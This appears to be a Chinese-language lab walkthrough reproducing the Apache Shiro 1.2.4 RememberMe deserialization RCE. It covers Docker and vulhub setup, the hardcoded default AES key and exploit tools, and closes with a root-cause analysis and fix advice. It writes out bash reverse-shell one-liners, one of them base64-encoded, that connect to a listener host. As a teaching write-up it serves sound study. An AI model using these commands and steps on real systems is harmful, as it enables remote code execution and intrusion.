前言：就像雨总会停，雾总会散，同样地没有谁会一直失败。

## 一、漏洞描述

### 1.shiro概述

Apache Shiro是一个强大易用的Java安全框架，提供了认证、授权、加密和会话管理等功能。Shiro框架直观、易用，同时也能提供健壮的安全性。

### 2.漏洞原理

Apache
Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。

### 3.漏洞发现

1、检索RememberMe cookie 的值

2、Base 64解码

3、使用AES解密(加密密钥硬编码)

4、进行反序列化操作（未作过滤处理）

4.shiro序列化利用条件

由于使用了aes加密，要想成功利用漏洞则需要获取aes的加密密钥，而在shiro的1.2.4之前版本中使用的是硬编码。其默认密钥的base64编码后的值为kPH+bIxk5D2deZiIxcaaaA==，这里就可以通过构造恶意的序列化对象进行编码，加密，然后作为cookie加密发送，服务端接收后会解密并触发反序列化漏洞。

尽管目前已经更新了许多版本，官方并没有反序列化漏洞本身解决，而是通过去掉硬编码的密钥，使其每次生成一个密钥来解决该漏洞。但是，目前一些开源系统、教程范例代码都使用来固定的编码，这里我们可以通过搜索引擎、github等来收集密钥，提高漏洞检测与利用的成功率。

## 二.漏洞复现

### 1.环境搭建

获取docker镜像

docker pull medicean/vulapps:s_shiro_1

![1622636779_60b778ebc2e2daff4b37c.png!small?1622636779407](https://image.3001.net/images/20210602/1622636779_60b778ebc2e2daff4b37c.png!small?1622636779407)

重启docker

systemctl restart docker

启动docker镜像：

docker run -d -p 8081:8080 medicean/vulapps:s_shiro_1

![1622636799_60b778ff377d96c2fd82d.png!small?1622636798961](https://image.3001.net/images/20210602/1622636799_60b778ff377d96c2fd82d.png!small?1622636798961)

访问：

![1622636814_60b7790ea551d29aa5c9d.png!small?1622636814031](https://image.3001.net/images/20210602/1622636814_60b7790ea551d29aa5c9d.png!small?1622636814031)

验证

![1622636827_60b7791b3f2ae970f5a14.png!small?1622636826639](https://image.3001.net/images/20210602/1622636827_60b7791b3f2ae970f5a14.png!small?1622636826639)

抓包分析

![1622636837_60b77925b1b3e41b434be.png!small?1622636837237](https://image.3001.net/images/20210602/1622636837_60b77925b1b3e41b434be.png!small?1622636837237)

### 2.漏洞利用（1）--脚本攻击

1\. 下载shiro利用脚本，下载地址<https://github.com/zhzyker/shiro-1.2.4-rce>

![1622636847_60b7792ff1723d2a1412e.png!small?1622636847527](https://image.3001.net/images/20210602/1622636847_60b7792ff1723d2a1412e.png!small?1622636847527)

2 . 使用工具进行验证

python3 shiro-1.2.4_rce.py <http://10.10.10.128:8081/login>

![1622636858_60b7793a3ade131da80e5.png!small?1622636857766](https://image.3001.net/images/20210602/1622636858_60b7793a3ade131da80e5.png!small?1622636857766)

3.使用linux进入linuxshell模式。  
![1622636869_60b7794507de6cde4a392.png!small?1622636868601](https://image.3001.net/images/20210602/1622636869_60b7794507de6cde4a392.png!small?1622636868601)

4\. windos ： bash -i >&
/dev/tcp/[10.10.10.128:](http://118.193.36.37:53765/)8080/ 0>&1

linux系统需要编码之后，绕后再进行nc反弹。

<http://www.jackson-t.ca/runtime-exec-payloads.html>

![1622637120_60b77a4083610e08c402c.png!small?1622637119925](https://image.3001.net/images/20210602/1622637120_60b77a4083610e08c402c.png!small?1622637119925)

5.然后使用nc反弹

![1622637164_60b77a6ca24f7a5e598aa.png!small?1622637164011](https://image.3001.net/images/20210602/1622637164_60b77a6ca24f7a5e598aa.png!small?1622637164011)

### 漏洞利用（2）--自动化工具攻击

1.选择shiro550

![1622637277_60b77addf1db2ea226a75.png!small?1622637277323](https://image.3001.net/images/20210602/1622637277_60b77addf1db2ea226a75.png!small?1622637277323)

2.然后使用ceye.io进行利用

![1622637288_60b77ae89d3bc36544488.png!small?1622637288011](https://image.3001.net/images/20210602/1622637288_60b77ae89d3bc36544488.png!small?1622637288011)

3.验证key值

![1622637297_60b77af11672990f55461.png!small?1622637296735](https://image.3001.net/images/20210602/1622637297_60b77af11672990f55461.png!small?1622637296735)

![1622637305_60b77af93fe3b65d73347.png!small?1622637304619](https://image.3001.net/images/20210602/1622637305_60b77af93fe3b65d73347.png!small?1622637304619)

4.检测到漏洞，然后使用nc反弹shell

![1622637318_60b77b06d8610d962b2bb.png!small?1622637318363](https://image.3001.net/images/20210602/1622637318_60b77b06d8610d962b2bb.png!small?1622637318363)

5.然后监听到shell。

![1622637331_60b77b1312dd56d0cc194.png!small?1622637330441](https://image.3001.net/images/20210602/1622637331_60b77b1312dd56d0cc194.png!small?1622637330441)

### 漏洞利用方式3：burp插件

 **感谢作者（pmiaowu）提供的插件。**

下载地址：<https://github.com/pmiaowu/BurpShiroPassiveScan>

![1622637639_60b77c472c753bca56cc1.png!small?1622637638485](https://image.3001.net/images/20210602/1622637639_60b77c472c753bca56cc1.png!small?1622637638485)

## 三.vulhub环境复现

1.启动环境

![1622637726_60b77c9e543dfbe502568.png!small?1622637725887](https://image.3001.net/images/20210602/1622637726_60b77c9e543dfbe502568.png!small?1622637725887)

2.访问主页![1622637748_60b77cb461fa054378ac3.png!small?1622637747696](https://image.3001.net/images/20210602/1622637748_60b77cb461fa054378ac3.png!small?1622637747696)

3.使用脚本进行漏洞检测

![1622637767_60b77cc71e3099d687b77.png!small?1622637766828](https://image.3001.net/images/20210602/1622637767_60b77cc71e3099d687b77.png!small?1622637766828)

4.查看命令是否成功![1622637786_60b77cda81d87570b6809.png!small?1622637786195](https://image.3001.net/images/20210602/1622637786_60b77cda81d87570b6809.png!small?1622637786195)

4.使用命令：

    
    
    bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMjgvNjY2NiAwPiYx}|{base64,-d}|{bash,-i}

反弹shell

![1622637830_60b77d06a91ec9584819b.png!small?1622637830285](https://image.3001.net/images/20210602/1622637830_60b77d06a91ec9584819b.png!small?1622637830285)

5.执行命令

![1622637838_60b77d0eb60fc72a76c0b.png!small?1622637839574](https://image.3001.net/images/20210602/1622637838_60b77d0eb60fc72a76c0b.png!small?1622637839574)

6.反弹成功，拿到权限。

![1622637866_60b77d2adf7b29b8d24b3.png!small?1622637866248](https://image.3001.net/images/20210602/1622637866_60b77d2adf7b29b8d24b3.png!small?1622637866248)

## 四、漏洞原理分析

原理分析：根据shiro报告分析可以得到，主要存在几个重要的点:

> rememberMe cookie
>
> CookieRememberMeManager.java
>
> Base64
>
> AES
>
> 加密密钥硬编码
>
> Java serialization

1.首先正常登录，然后生成带有rememberme的返回cookie值。

2.生成cookie，shiro会提供rememberme功能，可以通过cookie记录登录用户，从而记录登录用户的身份认证信息，即下次无需登录即可访问。处理rememberme的cookie的类为org.apache.shiro.web.mgt.CookieRememberMeManager

3.之后进入serialize，对登录认证信息进行序列化

4.然后加密，调用aes算法。

5.加密结束，然后在在org/apache/shiro/web/mgt/CookieRememberMeManager.java的rememberSerializedIdentity方法中进行base64编码，并通过response返回

6.解析cookie

7.先解密在反序列化

8.AES是对称加密，加解密密钥都是相同的，并且shiro都是将密钥硬编码

9.调用crypt方法利用密文，key，iv进行解密,解密完成后进入反序列化，看上面的public
AbstractRememberMeManager()这里用的是默认反序列化类,然后触发生成反序列化。

## 五、修复建议：

Apache Shiro 1.2.5以下版本，建议抓紧升级shiro的版本，另一个修复建议就是将默认Key加密改为生成随机的Key加密。

## 总结：

web渗透不只有owasp10常见的一些漏洞，我们还需要学习一些框架的漏洞还有一些中间件的漏洞，自己的知识面广了，自己的渗透路就会更加宽阔。本文为初学者对中间件漏洞的一些理解。会的大佬跳过哈。

